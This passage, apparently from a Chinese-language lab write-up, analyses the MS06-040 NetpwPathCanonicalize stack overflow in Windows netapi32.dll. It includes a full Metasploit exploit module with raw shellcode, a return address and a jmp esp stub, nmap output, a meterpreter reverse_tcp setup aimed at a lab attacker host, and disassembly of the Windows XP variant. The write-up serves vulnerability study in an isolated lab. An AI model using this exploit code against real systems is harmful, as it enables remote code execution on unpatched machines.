class="line"></span><br></pre></td></tr></table></figure><p>两次边界检查的限制都是 Unicode 长度不能超过 0x411，换算成字节长度就是 0x822，而栈空间的大小是按字节开的 0x414。按照 ASCII 字符开辟空间，按照 Unicode 字符来检查边界是漏洞的根本原因。<br>依据以上的溢出原理，只要设计好 prefix 串和 path 串的长度，调用 NetpwPath Canonicalize 函数即可发生栈溢出。</p><h2 id="实现远程-exploit"><a class="markdownIt-Anchor" href="#实现远程-exploit"></a> 实现远程 exploit</h2><p>进行 RPC 调用的代码框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                     </span><br><span class="line">end</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>     =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span>  =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>   =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                    &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span>, <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                    ]]</span><br><span class="line">        ))</span><br><span class="line">register_options([OptString.new(</span><br><span class="line"><span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                            [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                            ),],</span><br><span class="line">                       self.<span class="keyword">class</span>)</span><br><span class="line">end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;3.0&#x27;</span>, <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = ......</span><br><span class="line">        path = ......</span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">            NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.long(<span class="number">0</span>)</span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect</span><br><span class="line">        </span><br><span class="line">end <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们只需要关注 path 串和 prefix 串的内容，在恰当的位置布置特定的内容， MSF 和远程的主机会自动按照 RPC 协议为我们完成网络握手、参数解析、函数定位等工作。</p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">    Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                      <span class="comment"># 主要就是上面这几行，还有最后一行多了一个end</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>   =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>  =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                            &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span> , <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                           ]]</span><br><span class="line">             ))</span><br><span class="line">        register_options([OptString.new(</span><br><span class="line">                                <span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                                [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                                ),],</span><br><span class="line">                         self.<span class="keyword">class</span>) </span><br><span class="line">    end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                              <span class="string">&#x27;3.0&#x27;</span>,  <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = <span class="string">&quot;\x8B\xC1\x83\xC0\x05\x59\x81\xC9\xD3\x62\x30\x20\x41\x43\x4D\x64&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7\x3A&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4\x5E&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A\x0A\x32\xE4\x50&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50\x56\x50\xFF\x56&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x00&quot;</span></span><br><span class="line">        path = <span class="string">&quot;\x90&quot;</span> * <span class="number">0x318</span> + [target[<span class="string">&#x27;Ret&#x27;</span>][<span class="number">1</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + </span><br><span class="line">            <span class="string">&quot;\x04\xD0\xFD\x7F&quot;</span> * <span class="number">5</span> +    <span class="comment"># writeable address</span></span><br><span class="line">            <span class="string">&quot;\x66\x81\xEC\x30\x04&quot;</span> +    <span class="comment"># sub esp,430</span></span><br><span class="line">            <span class="string">&quot;\x8B\xC4&quot;</span> +             <span class="comment"># mov eax, esp</span></span><br><span class="line">            <span class="string">&quot;\xFF\xE4&quot;</span> +            <span class="comment"># jmp esp</span></span><br><span class="line">            <span class="string">&quot;\x00\x00&quot;</span></span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">             NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">             NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">             NDR.long(<span class="number">0</span>)    </span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect    </span><br><span class="line">    end  <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>攻击机：kali</p><p>IP地址：192.168.188.141</p><p>靶机：Windows2000 sp4</p><p>IP地址：192.168.188.133</p><h3 id="准备"><a class="markdownIt-Anchor" href="#准备"></a> 准备</h3><p>首先确定靶机开启的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(host㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --allports -O 192.168.188.133                                                                               </span><br><span class="line">[sudo] host 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 21:22 CST</span><br><span class="line">Nmap scan report for 192.168.188.133</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1723/tcp open  pptp</span><br><span class="line">MAC Address: 00:0C:29:97:7A:5F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2000|XP</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_2000::- cpe:/o:microsoft:windows_2000::sp1 cpe:/o:microsoft:windows_2000::sp2 cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::- cpe:/o:microsoft:windows_xp::sp1</span><br><span class="line">OS details: Microsoft Windows 2000 SP0 - SP4 or Windows XP SP0 - SP1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到打开了445端口。</p><p>最后的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(rgzz/ms06_040) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/rgzz/ms06_040):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   192.168.188.133  yes       The target host(s), see https://gith</span><br><span class="line">                                       ub.com/rapid7/metasploit-framework/w</span><br><span class="line">                                       iki/Using-Metasploit</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh,</span><br><span class="line">                                        thread, process, none)</span><br><span class="line">   LHOST     192.168.188.141  yes       The listen address (an interface ma</span><br><span class="line">                                        y be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2000 SP0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上面给出的代码，结果出错了，导致了靶机关机。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220716170814837.png" alt="image-20220716170814837"></p><h3 id="调试-serviceexe"><a class="markdownIt-Anchor" href="#调试-serviceexe"></a> 调试 service.exe</h3><p>将OD附加到services上，然后在<code>NetpwPathCanonicalize</code>（0x75107AFD）上下一个断点，F9继续执行。</p><p style="color:red;">回到攻击机上，执行exploit，再回到靶机，发现并没有在 NetpwPathCanonicalize 停下，而是直接提示关机，这样就无法进行后续调试了。不知道是不是漏洞已经被修补的缘故。上面的本地实验中，我用的也是本书资料中提供的netapi32.dll。</p><h1 id="windows-xp-环境下的-ms06040-exploit"><a class="markdownIt-Anchor" href="#windows-xp-环境下的-ms06040-exploit"></a> Windows XP 环境下的 MS06—040 exploit</h1><h2 id="静态分析-2"><a class="markdownIt-Anchor" href="#静态分析-2"></a> 静态分析</h2><p>选取 Windows XP SP3 的 netapi32.dll，对其 CanonicalizePathName 函数做静态分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall CanonicalizePathName(wchar_t*, wchar_t *, wchar_t *, int, int)</span><br><span class="line">71BA428B CanonicalizePathName proc near</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B Buff_last_word = word ptr -416h</span><br><span class="line">71BA428B Buff_OF = word ptr -414h</span><br><span class="line">71BA428B arg_Prefix = dword ptr 8</span><br><span class="line">71BA428B arg_Path = dword ptr 0Ch</span><br><span class="line">71BA428B arg_CanPath = dword ptr 10h</span><br><span class="line">71BA428B arg_Maxbuf = dword ptr 14h</span><br><span class="line">71BA428B arg_CanSize = dword ptr 18h</span><br><span class="line">71BA428B</span><br><span class="line">71BA428B push ebp</span><br><span class="line">71BA428C mov ebp, esp</span><br><span class="line">71BA428E sub esp, 414h ; 依然分配了 0x414 字节栈空间，即 Buff_OF，</span><br><span class="line">; 用来存储合并路径(prefix+’\’+path)</span><br><span class="line">71BA4294 push ebx</span><br><span class="line">71BA4295 mov ebx, ds:__imp_wcscat</span><br><span class="line">71BA429B push esi</span><br><span class="line">71BA429C xor esi, esi</span><br><span class="line">71BA429E cmp [ebp+arg_Prefix], esi ; prefix 指针是否为 0</span><br><span class="line">71BA42A1 push edi</span><br><span class="line">71BA42A2 mov edi, ds:__imp_wcslen</span><br><span class="line">71BA42A8 jnz @@prefix_ptr_not_zero</span><br><span class="line">; 若 prefix 非 0，跳转至@@prefix_ptr_not_zero</span><br><span class="line">71BA42AE mov [ebp+Buff_OF], si ; 若 prefix 为 0，初始化 Buff_OF 为空串</span><br><span class="line">71BA42B5 @@chk_pathname:</span><br><span class="line">71BA42B5 push [ebp+arg_Path]</span><br><span class="line">71BA42B8 call edi ; __imp_wcslen ; 计算 path 串的 Unicode 长度</span><br><span class="line">71BA42BA add eax, esi; 计算合并路径长度</span><br><span class="line">71BA42BC cmp eax, 207h ; 对合并路径长度做越界检查，请注意，这里已经将</span><br><span class="line">                        ; 字节长度除 2，转化为 unicode 长度 0x207，而</span><br><span class="line">                        ; 在 Windows 2000 中，这个值是 0x411,没有做</span><br><span class="line">                        ; 转化，可见 Windows XP 的溢出另有原因！</span><br><span class="line">71BA42C1 pop ecx</span><br><span class="line">71BA42C2 ja @@err_invalid_name</span><br><span class="line">71BA42C8 push [ebp+arg_Path]</span><br><span class="line">71BA42CB lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA42D1 push eax</span><br><span class="line">71BA42D2 call ebx ; __imp_wcscat ; 将 Buff_OF(prefix+’\’)与 path 串合并</span><br><span class="line">; 得到合并路径</span><br><span class="line">…</span><br><span class="line">71BA4317 lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA431D push eax</span><br><span class="line">71BA431E call edi ; __imp_wcslen ; 计算合并路径 Unicode 长度</span><br><span class="line">71BA4320 lea eax, [eax+eax+2] ; 将 Unicode 长度转化为字节长度并加上结尾</span><br><span class="line">; 的两个空字节</span><br><span class="line">71BA4324 cmp eax, [ebp+arg_Maxbuf] ; 检查 can_path 的容量 maxbuf，是否可以</span><br><span class="line">; 可以容纳合并路径</span><br><span class="line">71BA4327 pop ecx</span><br><span class="line">71BA4328 ja @@err_buf_too_small ; 若 can_path 空间不够，退出</span><br><span class="line">71BA432E lea eax, [ebp+Buff_OF]</span><br><span class="line">71BA4334 push eax</span><br><span class="line">71BA4335 push [ebp+arg_CanPath]</span><br><span class="line">71BA4338 call ds:__imp_wcscpy; 将合并路径复制 Buff_OF 至 can_path</span><br><span class="line">71BA433E pop ecx</span><br><span class="line">71BA433F pop ecx</span><br><span class="line">71BA4340 xor eax, eax ; 路径合并成功，返回 0</span><br><span class="line">71BA4342 @@quit:</span><br><span class="line">71BA4342 pop edi</span><br><span class="line">71BA4343 pop esi</span><br><span class="line">71BA4344 pop ebx</span><br><span class="line">71BA4345 leave</span><br><span class="line">71BA4346 retn 14h</span><br><span class="line">71BA4349 @@err_invalid_name:</span><br><span class="line">71BA4349 push ERROR_INVALID_NAME</span><br><span class="line">71BA434B pop eax</span><br><span class="line">71BA434C jmp short @@quit</span><br><span class="line">71BA434C CanonicalizePathName endp</span><br><span class="line">…</span><br><span class="line">71BB0E2D @@prefix_ptr_not_zero:</span><br><span class="line">71BB0E2D push [ebp+arg_Prefix]</span><br><span class="line">71BB0E30 call edi ; __imp_wcslen</span><br><span class="line">71BB0E32 mov esi, eax ; esi 存储 prefix 串的 unicode 长度</span><br><span class="line">71BB0E34 test esi, esi ; 检查 prefix 串长度是否为 0，即空串</span><br><span class="line">71BB0E36 pop ecx</span><br><span class="line">71BB0E37 jz @@chk_pathname ; 如果 prefix 为空串，则跳至</span><br><span class="line">                                    ; @@chk_pathname，请注意，如果代码</span><br><span class="line">                                    ; 流程走到这里， Buff_OF 始终是没有初</span><br><span class="line">                                    ; 始化的！这是 MS06-040 的另一个溢出点</span><br><span class="line">71BB0E3D cmp esi, 208h ; 如果 prefix 串非空，其 Unicode 长度</span><br><span class="line">; 不能超过 0x208，否则退出</span><br><span class="line">71BB0E43 ja @@err_invalid_name</span><br><span class="line">…</span><br><span class="line">71BB0EA9 @@err_buf_too_small:</span><br><span class="line">71BB0EA9 mov ecx, [ebp+arg_CanSize]</span><br><span class="line">71BB0EAC test ecx, ecx</span><br><span class="line">71BB0EAE jz short @@err_buf_too_small2</span><br><span class="line">71BB0EB0 mov [ecx], eax</span><br><span class="line">71BB0EB2 @@err_buf_too_small2:</span><br><span class="line">71BB0EB2 mov eax, NERR_BufTooSmall</span><br><span class="line">71BB0EB7 jmp @@quit</span><br><span class="line">…</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure><p>从上面的第 31 行中可以看到，上一个实验中 cmp eax,411 已经被修补，无法在利用。不过，通过进一步静态分析，可以发现 CanonicalizePathName 函数在分配了栈空间 Buff_OF 后，没有进行初始化；如果 prefix 指针为 0，代码会对 Buff_OF 做初始化（见 0x71BA42AE）；而如果 prefix 非 0，并指向空字串，代码将直接对未初始化的 Buff_OF 和 path 串用 wcscat 函数进行连接（见 0x71BA42B5-0x71BA42D2）。这是一个非常危险的操作，因为未初始化的栈空间 Buff_OF 的长度是未知的，甚至可能超过 0x414 字节，其后再连接上 path 串，很有可能产生溢出。</p><p>由于 Buff_OF 位于栈中，内容随机，怎样控制它的长度，是如何利用这个漏洞的重点。我们可以通过连续调用 CanonicalizePathName 函数来控制它的长度。 因为当 Buff_OF 被首次填充并连接，直到 CanonicalizePathName 函数退出后，其所在的栈空间位于 ESP 的低地址，如果不做任何栈操作，如函数调用等，内容是不会改变的；此时，如果再次调用 CanonicalizePathName，已经被填充的 Buff_OF 将面临溢出的风险。</p><p>CanonicalizePathName 是 NetpwPathCanonicalize 的子函数，不能直接被调用。分析一下函数 NetpwPathCanonicalize 是如何调用 CanonicalizePathName 的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71BA421A mov esi, [ebp+arg_CanPath]</span><br><span class="line">71BA421D push edi</span><br><span class="line">71BA421E push [ebp+arg_Maxbuf]</span><br><span class="line">71BA4221 mov [esi], di</span><br><span class="line">71BA4224 push esi</span><br><span class="line">71BA4225 push [ebp+arg_Path]</span><br><span class="line">71BA4228 push ebx</span><br><span class="line">71BA4229 call CanonicalizePathName</span><br><span class="line">71BA422E cmp eax, edi ; 检查函数 CanonicalizePathName 的返回值</span><br><span class="line">71BA4230 jnz short @@quit ; 非 0 则直接退出</span><br><span class="line">71BA4232 push edi</span><br><span class="line">71BA4233 push [ebp+arg_Pathtype]</span><br><span class="line">71BA4236 push esi</span><br><span class="line">71BA4237 call NetpwPathType</span><br><span class="line">71BA423C jmp short @@quit</span><br><span class="line">...</span><br><span class="line">; =============== S U B R O U T I N E =======================================</span><br><span class="line">; int __stdcall NetpwPathCanonicalize(wchar_t *, wchar_t *, int, int, int, int)</span><br><span class="line">71BA4244 public NetpwPathCanonicalize</span><br><span class="line">71BA4244 NetpwPathCanonicalize proc near</span><br><span class="line">71BA4244</span><br><span class="line">71BA4244 arg_Path = dword ptr 8</span><br><span class="line">71BA4244 arg_CanPath = dword ptr 0Ch</span><br><span class="line">71BA4244 arg_Maxbuf = dword ptr 10h</span><br><span class="line">71BA4244 arg_Prefix = dword ptr 14h</span><br><span class="line">71BA4244 arg_Pathtype = dword ptr 18h</span><br><span class="line">71BA4244 arg_Pathflags = dword ptr 1Ch</span><br><span class="line">...</span><br><span class="line">71BA4284 @@quit</span><br><span class="line">71BA4284 pop edi</span><br><span class="line">71BA4285 pop esi</span><br><span class="line">71BA4286 pop ebx</span><br><span class="line">71BA4287 pop ebp</span><br><span class="line">71BA4288 retn 18h</span><br><span class="line">71BA4288 NetpwPathCanonicalize endp</span><br><span 